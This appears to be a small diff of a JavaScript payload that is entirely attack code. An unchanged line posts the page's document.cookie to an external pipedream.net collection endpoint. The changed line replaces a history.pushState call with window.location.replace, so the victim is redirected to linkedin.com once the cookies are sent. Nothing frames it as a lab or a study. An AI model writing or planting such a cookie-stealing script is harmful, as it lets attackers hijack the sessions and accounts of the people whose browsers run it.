@@ -1,2 +1,2 @@
 fetch('https://eo7ue0lrzs0vw0h.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})});
-history.pushState({}, '', 'https://linkedin.com');
+window.location.replace('https://linkedin.com');
